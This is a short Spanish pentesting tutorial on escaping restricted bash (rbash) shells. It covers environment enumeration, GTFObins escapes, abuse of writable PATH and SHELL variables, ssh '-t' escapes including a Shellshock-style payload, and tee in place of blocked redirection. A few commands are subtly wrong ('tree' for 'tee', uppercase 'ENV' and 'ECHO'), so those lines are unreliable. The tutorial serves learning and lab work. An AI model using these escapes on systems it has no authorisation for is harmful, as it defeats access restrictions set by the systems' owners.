---
title: Escape Restricted Shell
published: true
---

# RESTRICTED SHELLS

Es una shell que restringe muchas funcionalidades y comandos del sistema. Para hacer esto se define la bash como `rbash`.

Esto limita lo siguiente:

- Habilidad de cambiar de directorio (cd).
- especificar rutas absolutas o archivos que contengan `/` o `-`.
- comandos que usen barras `/`.
- Setear o desetear contenido de la variable de entorno PATH.
- usar ENV o BASH_ENV para manipular variables de entorno.
- Usar redirecciones de bash (>, >>, >|, <>, >&, &>)
- no es posible desactivar el modo restringido con `set +r`o `set +o restricted`.

```bash
cd

rbash: cd: restricted
```

**ENUMERACION**

podemos correr el siguiente comando y ver las variables de entorno **\$SHELL** y **\$PATH**:

```bash
ENV


#output 

...
SHELL=/bin/rbash
PATH=/var/chroot/bin
...

```

en caso de no estar disponible podemos hacer:

```bash
ECHO $0

echo $PATH

echo $SHELL
```

`$0` devuelve el nombre del proceso en ejecución. Si se usa dentro de un shell, devolverá el nombre del shell.

podemos ver los comandos disponibles en esa rbash enumerando el directorio `/usr/local/rbin/`, en caso de no estar disponible **ls** podemos usar echo:

```bash
ls /usr/local/rbin/

echo /usr/local/rbin/*
```

Investigue cada comando disponible para ver si hay escapes de shell conocidos asociados con ellos. Algunas de las técnicas se pueden combinar juntas.

**ESCAPE**

a traves de binarios de [GTFObins](https://gtfobins.github.io/) podemos escapar a una shell, aunque sea no privilegiada pero a una mas funcional:

Busque variables de escritura. Ejecutar `export -p`para listar las variables exportadas. La mayoría de las veces `SHELL`y `PATH`lo serán `-rx`, lo que significa que son ejecutables pero no escribibles. Si se pueden escribir, simplemente configúrelos `SHELL`en el shell de su elección o `PATH`en un directorio con comandos explotables.

**ESCAPE ANTES DE CONECTARSE A LA RBASH**

```bash
ssh user@10.0.0.3 -t "/bin/sh"
```

```bash
ssh user@10.0.0.3 -t "bash --noprofile"
```

shellshock:

```bash
ssh user@10.0.0.3 -t "(){:;}; /bin/bash"
```

**REDIRECCION DE SALIDA**

Dado que los operadores de redirección ( `>`o `>>`) generalmente están restringidos, el `tee`comando puede ayudarlo a redirigir la salida de, por ejemplo, el `echo`comando

```BAsh
echo '#!/usr/bin/env bash' | tree script.sh
echo '# Your code' | tee -a script.sh
```

[https://0xffsec.com/handbook/shells/restricted-shells/](https://0xffsec.com/handbook/shells/restricted-shells/)